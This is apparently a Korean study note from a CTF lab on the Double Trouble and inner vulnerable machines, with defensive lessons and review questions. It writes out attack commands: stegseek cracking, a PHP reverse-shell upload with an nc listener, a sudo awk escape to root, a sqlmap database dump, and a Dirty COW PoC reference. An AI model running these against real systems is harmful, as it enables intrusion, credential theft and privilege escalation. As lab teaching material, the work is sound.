# 2026-10-02 · CTF 실습 — 모의해킹 공격 체인 (Double Trouble / inner)

> 원본: [original/1002_261006_093713_1.pdf](original/1002_261006_093713_1.pdf)
>
> ⚠️ 아래는 **교육용 취약 CTF 머신(의도적으로 취약하게 만든 실습 환경)** 에 대한 학습 기록이다.
> 정찰 → 취약점 → 권한상승으로 이어지는 공격 체인의 **사고 흐름**을 정리한 것으로,
> 실제 운영 시스템 대상 사용은 금지된다. 방어 관점에서 "무엇을 막아야 하는가"로 함께 읽는다.

## 1. CTF: Double Trouble
### 정찰 (Recon)
- 대상: **qdPM** 기반 사이트. qdPM 9.1 버전에는 XSS / SQL Injection / RCE 등의 알려진 취약점이 존재.
- 디렉터리 스캔: `gobuster`로 숨은 경로 탐색 → `http://<target>/secret/doubletrouble.jpg` 확인.

### 스테가노그래피 (Steganography)
- 해당 jpg에 데이터가 숨겨져 있는지 **stegseek**로 추출.
```
stegseek doubletrouble.jpg -wl /usr/share/wordlists/rockyou.txt
cat <추출파일>     # email / pw 확인
```
- 교훈(방어): 공개 디렉터리에 민감 파일 노출 금지, 디렉터리 리스팅 차단.

### 취약점 → 리버스 셸 (RCE)
- 로그인 후 **파일 업로드(프로필 사진)** 기능을 악용해 PHP reverse shell을 업로드하는 전형적 흐름.
  - 업로드 필터가 없으면 이미지 대신 스크립트가 올라가고, 접근 시 서버에서 실행됨.
- 공격 측에서 리스너를 열고 연결을 받는다: `nc -lvnp 5555`
- 획득 권한: Apache 실행 계정(`www-data`) 수준.

### 권한 상승 (Privilege Escalation) — sudo 오설정
```
sudo -l      # 현재 계정이 비밀번호 없이 쓸 수 있는 sudo 권한 확인
# 결과 예: (ALL) NOPASSWD: /usr/bin/awk
sudo awk 'BEGIN { system("/bin/bash") }'    # awk로 셸 실행 → root
```
- **GTFOBins** 류 기법: 합법 바이너리(awk)가 NOPASSWD sudo로 열려 있으면 셸 탈출로 root 획득.
- root로 다음 단계 파일(`doubletrouble.ova`) 확보 → 2단계 CTF로 연결.
- 교훈(방어): `sudo` NOPASSWD 범위 최소화, 셸 탈출 가능한 바이너리를 sudo로 허용하지 말 것.

## 2. CTF: inner — SQL Injection + 커널 권한상승
### SQLi 자동화 (sqlmap)
```
sqlmap -u http://<target>/index.php --forms                 # 폼에서 주입점 탐지
sqlmap -u http://<target>/index.php --forms --dbs           # DB 목록
   # information_schema / doubletrouble 등 확인
sqlmap -u ... --forms -D doubletrouble --tables             # 테이블 목록
sqlmap -u ... --forms -D doubletrouble -T users --dump      # users 테이블 덤프
   # id: montreux / pw: ****     id: clapton / pw: ****
```
- 덤프한 자격증명으로 `clapton` 계정 **SSH 접속**.
- 교훈(방어): 파라미터 바인딩(prepared statement)으로 SQLi 차단, DB 계정 최소 권한.

### 커널 취약점으로 권한 상승
```
uname -a        # 커널 버전 확인 → Linux 3.2.0-4-amd64
```
- 해당 버전에 맞는 공개 취약점 검색: **CVE-2016-5195 (Dirty COW)** 등.
- Exploit-DB에서 대응 PoC(예: EDB-ID 40839) 확인 → 빌드/실행 시 root 권한 획득 가능.
- 교훈(방어): **커널·패키지 정기 패치**가 가장 확실한 대응. 오래된 커널은 공개 PoC에 그대로 노출.

### 다음 단계
- **Bee-Box**(bWAPP 기반 취약 VM) 실습으로 이어짐.

## 3. 공격 체인 요약 (방어 관점 매핑)
| 단계 | 공격 기법 | 방어 포인트 |
|---|---|---|
| 정찰 | 디렉터리 스캔, 알려진 취약 버전 | 불필요 경로/파일 제거, 버전 노출 최소화, 패치 |
| 초기 침투 | 파일 업로드 → 웹셸, SQLi | 업로드 검증(확장자·MIME·실행권한), prepared statement |
| 자격 탈취 | stego, DB 덤프 | 민감파일 비공개, DB 암호화·최소권한 |
| 권한 상승 | sudo 오설정, 커널 CVE | sudo 최소화, 정기 패치, GTFOBins 점검 |

## 4. 복습 질문
1. 파일 업로드 기능에서 웹셸 업로드를 막으려면 무엇을 검증해야 하나?
2. `sudo -l` 결과에서 위험 신호는 무엇인가?
3. SQL Injection을 코드 레벨에서 근본적으로 막는 방법은?
4. 오래된 커널이 위험한 이유를 공격자 관점에서 설명하면?
